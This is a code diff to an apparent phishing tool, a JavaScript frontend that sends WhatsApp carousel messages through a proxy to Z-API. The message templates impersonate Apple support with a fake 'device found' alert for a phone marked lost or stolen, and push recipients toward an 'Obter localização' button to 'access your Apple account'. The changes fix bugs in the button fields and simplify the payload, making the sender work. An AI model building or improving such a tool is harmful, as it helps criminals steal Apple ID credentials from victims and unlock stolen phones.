@@ -77,7 +77,6 @@ const generalCarouselMessageTemplate = "*🍏 Assistente Virtual Apple – Supor
 const defaultCardTemplateText = `*🔔 ALERTA DE LOCALIZAÇÃO: Dispositivo Encontrado*
 
 Detectamos a localização do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roubado.
-
 ➡️ Por segurança, uma *imagem* foi capturada no momento da localização. Para visualizar os dados e iniciar o processo de recuperação de forma segura, acesse sua conta Apple:
 
 👇 Toque no *botão* abaixo para continuar com a verificação:
@@ -603,15 +602,15 @@ function toggleButtonFields(cardId, buttonIndex) {
     const buttonType = buttonTypeSelect.value;
 
     if (buttonUrlField) buttonUrlField.classList.add('hidden');
-    if (buttonPhoneField) phoneField.classList.add('hidden');
+    if (buttonPhoneField) buttonPhoneField.classList.add('hidden');
 
     if (buttonType === 'URL') {
-        if (buttonUrlField) urlField.classList.remove('hidden');
+        if (buttonUrlField) buttonUrlField.classList.remove('hidden');
         if (buttonLabelInput && buttonLabelInput.value === "") {
             buttonLabelInput.value = "Obter localização";
         }
     } else if (buttonType === 'CALL') {
-        if (phoneField) phoneField.classList.remove('hidden');
+        if (buttonPhoneField) buttonPhoneField.classList.remove('hidden');
         if (buttonLabelInput && buttonLabelInput.value === "") {
             buttonLabelInput.value = "Ligar";
         }
@@ -643,13 +642,15 @@ async function enviarCarrossel() {
     // ADIÇÃO CRÍTICA: REMOVER QUALQUER '+' INICIAL DO NÚMERO COMPLETO
     numeroCompleto = numeroCompleto.replace(/^\+/, ''); 
 
-    // --- AQUI ESTÁ A CORREÇÃO: DESCOMENTAR ESTAS LINHAS ---
-    const mensagemGeral = document.getElementById('mensagemGeral').value.trim();
-    const delayMessage = document.getElementById('delayMessage').value.trim();
-    // --- FIM DA CORREÇÃO ---
+    // O frontend não precisa enviar 'mensagemGeral' ou 'delayMessage' para o proxy
+    // se o proxy já não as usa para o endpoint de carrossel da Z-API.
+    // O backend já tem a responsabilidade de montar o payload exato para a Z-API.
+    // Removendo-os daqui, evitamos enviar dados desnecessários.
+    // const mensagemGeral = document.getElementById('mensagemGeral').value.trim();
+    // const delayMessage = document.getElementById('delayMessage').value.trim();
 
-    if (!rawNumero || !selectedDDI || !mensagemGeral) { // Validação agora inclui mensagemGeral
-        log.innerText = '❌ Por favor, preencha o DDI do país, o número do cliente e a mensagem geral.';
+    if (!rawNumero || !selectedDDI) { // A validação de mensagemGeral pode ser removida se ela não for enviada
+        log.innerText = '❌ Por favor, preencha o DDI do país e o número do cliente.';
         return;
     }
 
@@ -717,25 +718,25 @@ async function enviarCarrossel() {
         });
     }
 
+    // O payload enviado do frontend para o PROXY (seu server.js)
+    // Agora ele só inclui o 'phone' e o 'carousel' (seus cartões).
+    // O 'server.js' faz o remapeamento para 'elements' e adiciona tokens na URL.
     const payloadToProxy = {
         phone: numeroCompleto,
-        message: mensagemGeral, // AGORA INCLUÍDO NO PAYLOAD
-        carousel: carouselCards,
-        ...(delayMessage && { delayMessage: parseInt(delayMessage) }) // AGORA INCLUÍDO NO PAYLOAD
+        carousel: carouselCards // 'carouselCards' é o array de cartões do frontend
     };
-
-    // --- ADIÇÃO DE LOG NO FRONTEND ---
+// --- ADIÇÃO DE LOG NO FRONTEND ---
     console.log("Payload enviado do frontend para o proxy:", JSON.stringify(payloadToProxy, null, 2));
     // --- FIM DA ADIÇÃO DE LOG ---
-
     try {
         log.innerText = 'Enviando carrossel...';
+        // A requisição é enviada para o seu próprio proxy (proxyCarouselUrl)
         const response = await fetch(proxyCarouselUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify(payloadToProxy)
+            body: JSON.stringify(payloadToProxy) // Envia o payload simplificado para o proxy
         });
 
         const data = await response.json();
@@ -761,6 +762,7 @@ document.addEventListener('DOMContentLoaded', () => {
         mensagemGeralInput.setAttribute('readonly', 'true'); 
     }
 
+    // Inicializa com um cartão vazio (ou padrão)
     addCarouselCard(); 
     
     const countryDDISelect = document.getElementById("countryDDI");
